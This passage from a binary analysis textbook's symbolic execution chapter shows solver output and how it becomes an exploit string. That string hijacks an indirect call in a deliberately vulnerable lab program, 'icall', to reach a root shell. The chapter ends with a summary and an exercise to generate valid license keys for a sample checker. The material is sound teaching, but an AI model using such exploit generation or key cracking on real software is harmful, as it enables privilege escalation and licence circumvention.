   SymVar_2 = 0x58 (argv[2][2])<br/>   SymVar_3 = 0x26 (argv[2][3])<br/>   SymVar_4 = 0x40 (argv[2][4])<br/>   SymVar_5 = 0x20 (argv[1][0])<br/>   SymVar_6 = 0x40 (argv[1][1])<br/>   Trying input len 5<br/><span class="ent">➏</span> SymVar_0 = 0x64 (argv[2][0])<br/>   SymVar_1 = 0x2A (argv[2][1])<br/>   SymVar_2 = 0x58 (argv[2][2])<br/>   SymVar_3 = 0x26 (argv[2][3])<br/>   SymVar_4 = 0x3C (argv[2][4])<br/>   SymVar_5 = 0x40 (argv[2][5])<br/>   SymVar_6 = 0x40 (argv[1][0])<br/>   SymVar_7 = 0x40 (argv[1][1])<br/>   Trying input len 6<br/>   <span class="codestrong1">ˆC</span></pre>&#13;
<p class="indent">Here, I’ve used a <code>bash for</code> statement to loop over all integers <em>i</em> between 1 and 100 <span class="ent">➊</span>. In each iteration, the loop creates a string of <em>i</em> letter “A” characters <span class="ent">➋</span> and then tries to generate an exploit with this length-<em>i</em> string as the user input <span class="ent">➌</span>, just like you saw in <a href="ch13.xhtml#ch13list18">Listing 13-18</a> for length 3.<sup><a id="ch13fn_8a" href="footnote.xhtml#ch13fn_8">8</a></sup></p>&#13;
<p class="indent">To reduce clutter in the output, you can use <code>grep</code> to display only output lines containing the word <em>SymVar</em>. This ensures that the output shows only those lines printed from successful models and that exploit generation attempts that don’t produce a model fail silently.</p>&#13;
<p class="indent">The exploit loop’s output starts at <span class="ent">➍</span>. It fails to find a model for input lengths 1 through 3 but succeeds for length 4 <span class="ent">➎</span> and again for length 5 <span class="ent">➏</span>. I’ve stopped execution after that because there’s no need to try more input lengths when you’ve already found an exploit.</p>&#13;
<p class="indent">Let’s try the first exploit reported in the output (the one with length 4). To translate this output into an exploit string, you concatenate the ASCII characters that the solver assigned to the symbolic variables that correspond to <code>argv[2][0]</code> through <code>argv[2][3]</code> since those are the user input bytes used as input for <code>icall</code>’s hash function. As you can see in <a href="ch13.xhtml#ch13list19">Listing 13-19</a>, the solver chose the values <code>0x24</code>, <code>0x2A</code>, <code>0x58</code>, and <code>0x26</code> for those bytes, respectively. The byte at <code>argv[2][4]</code> should be the terminating <code>NULL</code> of the user input string, but the solver doesn’t know that and so picked the random input byte <code>0x40</code> for that position, which you can safely ignore.</p>&#13;
<p class="indent">The bytes assigned to <code>argv[2][0]</code> through <code>argv[2][3]</code> in the model correspond to the ASCII exploit string <code>$*X&amp;</code>. Let’s try giving this exploit string as input to <code>icall</code> in <a href="ch13.xhtml#ch13list20">Listing 13-20</a>.</p>&#13;
<p class="listing1" id="ch13list20"><span epub:type="pagebreak" id="page_371"/><em>Listing 13-20: Exploiting the</em> <span class="codeitalic">icall</span> <em>program</em></p>&#13;
<pre><span class="ent">➊</span> $ <span class="codestrong1">cd ~/code/chapter13</span><br/><span class="ent">➋</span> $ <span class="codestrong1">./icall 2 '$*X&amp;'</span><br/><span class="ent">➌</span> Calling 0x400b3b<br/><span class="ent">➍</span> <span class="codestrong1"># whoami</span><br/>  root</pre>&#13;
<p class="indent">To try the exploit, you navigate back to the code directory for this chapter, where <code>icall</code> is <span class="ent">➊</span>, and then call <code>icall</code> with the out-of-bounds index 2 and the just-generated exploit string <span class="ent">➋</span>. As you can see, the exploit string hashes exactly to <code>0x400b3b</code>, the address of the secret admin area <span class="ent">➌</span>. Thanks to the lack of bounds checking on the function pointer index given by the user, you successfully trick <code>icall</code> into calling that address and giving you a root shell <span class="ent">➍</span>. As you can see, the command <code>whoami</code> prints <code>root</code>, verifying that you’ve obtained a root shell. You’ve automatically generated an exploit using symbolic execution!</p>&#13;
<h3 class="h3" id="ch13_6">13.6 Summary</h3>&#13;
<p class="indent">In this chapter, you learned how to use symbolic execution to build tools that automatically uncover nontrivial information about binary programs. Symbolic execution is one of the most powerful binary analysis techniques, although you have to use it with care to minimize scalability issues. As you’ve seen in the automatic exploitation example, you can further increase the effectiveness of your symbex tools by combining them with other techniques, such as dynamic taint analysis.</p>&#13;
<p class="indent">If you’ve read this book in its entirety, you should now be familiar with a variety of binary analysis techniques that you can use for a wide range of goals, from hacking and security testing to reverse engineering, malware analysis, and debugging. I hope this book has enabled you to work more effectively on your own binary analysis projects and that it’s given you a solid basis from which to continue learning in the field of binary analysis, perhaps even advancing it through your own contributions!</p>&#13;
<div class="box">&#13;
<p class="headbox" id="ch13_7">Exercise</p>&#13;
<p class="boxhead1">1. Generating License Keys</p>&#13;
<p class="noindent">In the code directory for this chapter, you’ll find a program called <em>license.c</em> that takes as input a serial number and checks whether it’s valid (similar to license key checks in commercial software). Make a symbolic execution tool with Triton that can generate valid license keys accepted by <em>license.c</em>.</p>&#13;
</div>&#13;
</div></body></html>